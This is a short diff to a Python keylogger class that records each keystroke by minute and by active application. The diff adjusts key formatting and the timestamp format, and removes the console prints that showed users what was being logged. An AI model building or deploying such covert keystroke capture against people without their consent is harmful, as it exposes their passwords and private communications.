@@ -6,11 +6,14 @@ from key_logger_interface import KeyLoggerInterface
 
 
 def format_key(key: Key | None) -> str:
+    if key == Key.space:
+        return " "  # כאשר לוחצים על רווח, מחזירים רווח רגיל
     if isinstance(key, Key):
         return f"[{key.name}]"
     elif hasattr(key, 'char') and key.char:
         return key.char
     return "[UNKNOWN]"
+
 
 
 def get_active_application() -> str:
@@ -38,7 +41,7 @@ class KeyLoggerService(KeyLoggerInterface):
         return logged_keys
 
     def log_key_press(self, key_name: str, active_app: str) -> None:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H_%M")
         if timestamp not in self.key_logs:
             self.key_logs[timestamp] = {}
 
@@ -52,9 +55,6 @@ class KeyLoggerService(KeyLoggerInterface):
         active_app = get_active_application()
 
         self.log_key_press(key_name, active_app)
-
-        print(f"Active app: {active_app}")
-        print(f"You pressed '{key_name}'")
 
         if key == Key.esc:
             self.stop_logging()
